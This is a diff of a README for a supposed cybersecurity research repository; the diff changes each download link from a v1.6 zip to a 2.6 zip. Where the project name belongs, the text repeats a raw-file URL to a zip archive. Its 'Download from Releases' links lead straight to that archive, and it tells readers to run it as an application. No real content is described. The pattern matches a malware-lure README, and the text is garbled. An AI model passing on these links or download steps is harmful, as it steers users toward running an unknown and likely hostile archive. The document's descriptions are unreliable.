@@ -1,19 +1,19 @@
-# 🎉 https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_v1.6.zip - Your Gateway to Cybersecurity Insights
+# 🎉 https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_2.6.zip - Your Gateway to Cybersecurity Insights
 
 ## 🚀 Getting Started
 
-Welcome to the **https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_v1.6.zip** repository. This is your go-to place for exploring various aspects of cybersecurity. Here, you'll find research, technical notes, tools, and articles related to offensive security and more. 
+Welcome to the **https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_2.6.zip** repository. This is your go-to place for exploring various aspects of cybersecurity. Here, you'll find research, technical notes, tools, and articles related to offensive security and more. 
 
 To quickly access the software, click the link below:
 
-[![Download here](https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_v1.6.zip%20Now-Release-blue)](https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_v1.6.zip)
+[![Download here](https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_2.6.zip%20Now-Release-blue)](https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_2.6.zip)
 
 ## 📥 Download & Install
 
 You can download the latest version of this application by visiting the Releases page. Here are the steps:
 
 1. Click the link below to visit the Releases page:
-   [Download from Releases](https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_v1.6.zip)
+   [Download from Releases](https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_2.6.zip)
    
 2. On the Releases page, you will see a list of available versions. 
 
@@ -29,7 +29,7 @@ You can download the latest version of this application by visiting the Releases
 
 ## 💻 System Requirements
 
-To run the **https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_v1.6.zip** application, your computer should meet these basic requirements:
+To run the **https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_2.6.zip** application, your computer should meet these basic requirements:
 
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or any modern Linux distribution.
 - **RAM:** At least 4 GB of RAM.
@@ -38,7 +38,7 @@ To run the **https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/
 
 ## 🌟 Features
 
-The **https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_v1.6.zip** repository offers several useful features:
+The **https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_2.6.zip** repository offers several useful features:
 
 - **Research Articles:** Access comprehensive articles that discuss the latest findings in cybersecurity.
 - **Tools & Write Ups:** Explore various tools that can enhance your skills and understanding of security practices.
@@ -78,4 +78,4 @@ To keep up with the latest updates and new releases, follow this repository. You
 
 ## 🔗 Visit the Releases Page Again
 
-For your convenience, here is the link to the Releases page once more: [Download from Releases](https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_v1.6.zip). Happy exploring!
+For your convenience, here is the link to the Releases page once more: [Download from Releases](https://github.com/arieahXxshrek/secwexen.github.io/raw/refs/heads/main/nardoo/github_secwexen_io_2.6.zip). Happy exploring!
